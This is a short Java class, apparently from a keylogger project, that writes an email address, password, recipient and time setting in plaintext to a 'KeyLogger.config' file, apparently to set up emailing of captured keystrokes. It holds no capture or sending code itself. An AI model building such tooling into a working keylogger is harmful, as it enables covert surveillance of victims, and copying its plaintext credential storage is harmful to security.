/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 *
 * @author Ayush Wadhwa
 */

import java.io.FileWriter;
import java.io.File.*;
import javax.swing.JOptionPane;
public class CreateConfigFile {
    private String email;
    private String pswd;
    private String recipientId;
    private String time;
    private StringBuilder str = new StringBuilder();
    FileWriter fw;
    CreateConfigFile(String email, String pswd, String recipientId, String time){
        this.email = email;
        this.pswd = pswd;
        this.recipientId = recipientId;
        this.time = time;
        createFile();
    }
    private void createFile(){
        try{
            str.append("{email:\"");
            str.append(email);
            str.append("\"password:\"");
            str.append(pswd);
            str.append("\"recipient:\"");
            str.append(recipientId);
            str.append("\"time:\"");
            str.append(time);
            str.append("\"}");
            fw = new FileWriter("..//config//KeyLogger.config");
            String writeStr = str.toString();
            fw.write(writeStr);
            fw.flush();
        }catch(Exception e){
            JOptionPane.showMessageDialog(null, e.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
        }
    }
}
